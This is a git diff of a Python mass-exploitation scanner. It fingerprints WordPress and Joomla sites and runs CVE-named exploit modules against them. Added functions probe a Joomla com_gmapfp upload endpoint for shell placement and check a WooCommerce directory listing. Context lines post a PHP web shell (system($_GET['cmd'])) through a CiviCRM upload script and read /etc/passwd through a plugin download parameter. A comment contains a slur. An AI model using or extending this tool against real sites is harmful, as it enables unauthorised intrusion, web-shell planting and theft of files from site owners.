@@ -1,7 +1,10 @@
 import os, requests, colorama, socket, getpass, subprocess, json, time, re, datetime, random, threading, io, multiprocessing
 import urllib3
 from Exploits.com_bjcontact import bj
+from Exploits.CVE202126723 import Jenzabar
+from Exploits.Hrsale import *
 from modules.search import dorker
+from Exploits.CVE202011731 import Media
 from Exploits.asistorage import asistorage
 import Exploits.colors
 from multiprocessing import Pool, freeze_support
@@ -427,6 +430,28 @@ def admintakeover(url):
         print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}admin_email_reset {PURPLE}=>{RESET} {RED}Not Vuln")
         pass
 
+def com_gmap(url):
+    '''
+    BROKENNNNN BC GAY
+    '''
+    #url = input("")
+    
+    HEADERS['Content_Type'] = 'multipart/form-data'
+    options = {
+        'file': open('shell/i.png', 'rb')
+    }
+    filename = "Results/shells.txt"
+    endpoint = url + "/index.php?option=com_gmapfp&controller=editlieux&tmpl=component&task=edit_upload&lang=en"
+    test = requests.get(endpoint, timeout=5)
+    if "Upload the picture" in test.text:
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}com_gmapfp {PURPLE}=> {GREEN}Vuln shell in {filename}")
+        with open(filename, "a+") as f:
+            f.write(test.url+'\n')
+        f.close()
+    #test = requests.post(endpoint, data=options,headers=HEADERS,verify=False)
+    #print(test.text)
+
+
 
 def wp_cherry(url):
         HEADERS['Content_Type'] = 'multipart/form-data'
@@ -493,6 +518,18 @@ def wp_blaze(url):
                 status=False
             )
 
+def woocommerce(url):
+    test = requests.get(url+"/wp-content/plugins/woocommerce/templates/emails/plain/")
+    filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
+    if test.status_code == 200:
+        if "Index of" in test.text:
+            with open(filename, "a+") as f:
+                f.write(f"Directory Traversal: {test.url}\n\n")
+                
+            f.close()
+            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}WooCommerce Directory Traversal {PURPLE}=>{RESET} {GREEN}Vuln saved to {GREEN}" + filename)
+    else:
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}WooCommerce Directory Traversal {PURPLE}=>{RESET} {RED}Not Vuln")
 
 def audioplayer(url):
     test = requests.get(url+"/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=/etc/passwd")
@@ -949,6 +986,7 @@ def auto(url):
             print(f"\n {PURPLE}[ {GREEN}~ {RESET} Starting vulnscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
             #wp_thumbnailSlider(url) Broken
             revslidercss(url)
+            Media(url)
             Spreedsheet(url)
             wp_blaze(url)
             spritz(url)
@@ -968,8 +1006,10 @@ def auto(url):
             revexploit(url)
             audioplayer(url)
             Triconsole(url)
+            woocommerce(url)
         elif "Joomla" in cms['name']:
             print(f"\n {PURPLE}[ {GREEN}~ {RESET} Starting Joomla Scan! {GREEN}~{RESET} {PURPLE}]{RESET}\n")
+            com_gmap(url)
             Scriptegrator(url)
             com_cckjseblod(url)
             Com_civicrm(url)
@@ -986,9 +1026,10 @@ def auto(url):
             asistorage(url)
             Exploitt(site)
             Triconsole(url)
-            
+            Jenzabar(url)
+            Hrsale(url)
     except Exception as e:
-        #print(e) debugging
+        print(e) 
         print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Connection Timout")
         return
         
@@ -1021,7 +1062,7 @@ def Triconsole(url):
             filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
             with open(filename, "a+") as f:
                 f.write(test.url + '\n')
-            print(f"{PURPLE} [ {GREEN}? {PURPLE}]{RESET} Triconsole XSS {PURPLE}=> {GREEN}Vuln {RESET}results saved to {GREEN}{filename}")
+            print(f"{PURPLE} [ {GREEN}$ {PURPLE}]{RESET} Triconsole XSS {PURPLE}=> {GREEN}Vuln {RESET}results saved to {GREEN}{filename}")
         
     elif "Vulnnr" in test1.text:
         if test1.status_code == 200:
@@ -1030,7 +1071,7 @@ def Triconsole(url):
             with open(filename, "a+") as f:
                 f.write(test1.url + '\n')
     else:
-        print(f"{PURPLE} [ {GREEN}? {PURPLE}]{RESET} Triconsole XSS {PURPLE}=> {RED}Not Vuln")
+        print(f"{PURPLE} [ {GREEN}! {PURPLE}]{RESET} Triconsole XSS {PURPLE}=> {RED}Not Vuln")
 def Com_civicrm(url):
     payloadshell = '"Vulnnr<?php {});?>"'.format('system({}'.format('$_GET["cmd"]'))
     requests.post(url+'/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php?name=vuln.php', data=payloadshell, headers=HEADERS, timeout=timeout)
@@ -1062,7 +1103,7 @@ def com_Questions(url):
         with open(filename, "a+") as f:
             f.write(test.url+ '\n')
     else:
-        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}com_questions {PURPLE}=> {RED}Not Vuln")
+        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}com_questions {PURPLE}=> {RED}Not Vuln")
 
 
 def normalerrors():
